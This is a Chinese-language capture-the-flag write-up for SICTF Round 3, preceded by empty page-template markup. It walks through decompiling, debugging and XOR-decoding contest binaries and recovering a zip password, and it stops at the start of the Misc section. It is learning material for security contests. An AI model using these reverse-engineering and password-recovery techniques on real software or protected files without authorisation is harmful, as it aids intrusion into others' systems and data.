        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>2024-SICTF Round#3-WriteUps_by_AhiSec</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1708080128"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2024/02/16
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/log.png" class="popup img-link preview-img shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/log.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="7801 字"
>
  <em>43 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <blockquote>
  <p>感谢队友带我飞.</p>
</blockquote>

<h2 id="reverse"><span class="me-2">Reverse</span><a href="#reverse" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="baby_c"><span class="me-2">Baby_C++</span><a href="#baby_c" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>1.签到题 shift + F12直接看见flag</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215441-9sj2msn.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215441-9sj2msn.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="ez_pyc"><span class="me-2">Ez_pyc</span><a href="#ez_pyc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>1.在线网址反编译不全，发现是3.8的python版本，直接使用3.8的uncompyle6反编译出源码</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215511-udsq715.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215511-udsq715.gif" alt="" loading="lazy"></a>​</p>

<div class="language-text highlighter-rouge"><div class="code-header">
        <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2.一个数独游戏可以求解不过观察判断条件，发现如果数独正确输出的flag是正确flag的md5后的值提交一下发现flag就是那个md5 
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215511-f858p9h.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215511-f858p9h.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="artbreaker"><span class="me-2">ArtBreaker</span><a href="#artbreaker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ol>
  <li>比较抽象IDA打开发现节点过多修改节点个数限制，发现flag在流程图里面</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215608-k78es0h.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215608-k78es0h.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="sweettofu"><span class="me-2">SweetTofu</span><a href="#sweettofu" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ol>
  <li>简单的签到，主函数就是用户输入并且判断输入的长度是否大于0x100,调用v1这个函数指针加密直接打断点运行到v1指向的函数</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215649-r6oftnq.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215649-r6oftnq.gif" alt="" loading="lazy"></a>​</p>

<p>2.发现就是一个异或0x66而已</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215649-k4htlhl.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215649-k4htlhl.gif" alt="" loading="lazy"></a>​</p>

<p>3.解密得到flag</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219215649-zckulmo.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219215649-zckulmo.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="battle-city"><span class="me-2">Battle City</span><a href="#battle-city" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ol>
  <li>坦克大战通关后会生成一个win.png的二维码扫码得到flag</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215724-skrmaal.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215724-skrmaal.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215724-87o0z5a.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215724-87o0z5a.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="进阶closeme"><span class="me-2">(🩸)[进阶]CloseMe</span><a href="#进阶closeme" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>首先翻到下面发现有一个xor，解密一下看看得到一段hint</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215756-k1i3ddo.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215756-k1i3ddo.jpg" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215756-wvch1zc.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215756-wvch1zc.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>++v64 == 16也就是说需要按16次</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219215756-ji4iwif.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219215756-ji4iwif.gif" alt="" loading="lazy"></a>​</p>

<p>判断按的是否为 0 1</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219215756-lhtv6zr.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219215756-lhtv6zr.gif" alt="" loading="lazy"></a>​</p>

<p>3.根据调试的结果这个代码就是将输入的 0 1倒叙后将输入的01当作整数，例如输入: 1011 将会变成 1101注意是整数 1101而不是二进制转十进制</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219215756-inapza9.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219215756-inapza9.gif" alt="" loading="lazy"></a>​</p>

<p>4.调试发现将输入的后两位截取</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image012-20240219215756-fxt3u1e.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image012-20240219215756-fxt3u1e.jpg" alt="" loading="lazy"></a>​</p>

<p>截取前14位和后2位拼接，相当于把最后两位放到前面来了</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image014-20240219215756-9a7bj4s.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image014-20240219215756-9a7bj4s.jpg" alt="" loading="lazy"></a>​</p>

<ol>
  <li>sub_7FF7845EAEC0函数实际执行的代码其实就只有这一段，这一段的作用是将变换后的01转为整数也就是二进制转十进制，return前 « 16</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image016-20240219215756-h6p7clq.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image016-20240219215756-h6p7clq.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image018-20240219215756-76oecl1.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image018-20240219215756-76oecl1.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>Check代码判断二进制转十进制再左移16后是不是0xA9F10000，确定这个为check的原因是如果不为0xA9F10000则会跳转到那个弹窗口的分支中</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image018-20240219215756-is2cki2.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image018-20240219215756-is2cki2.gif" alt="" loading="lazy"></a>​</p>

<p>7.也就是说正确的输入变化后的十进制为0xA9F1，将0xA9F1交换后再倒叙得到flag</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image020-20240219215756-r8if18a.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image020-20240219215756-r8if18a.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h2 id="misc"><span class="me-2">Misc</span><a href="#misc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="真签到"><span class="me-2">(🩸)真签到</span><a href="#真签到" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>1.压缩包要密码爆破不开，将压缩包拖入16进制编辑器发现HEX值解密得到一串看似BASE32的字符串但是其实是字母加密，字母加密的特点就是加密后的字母很重复，解密得到压缩包密码 2024HappyNewYear</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215834-m5jp2vo.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219215834-m5jp2vo.gif" alt="" loading="lazy"></a>​</p>

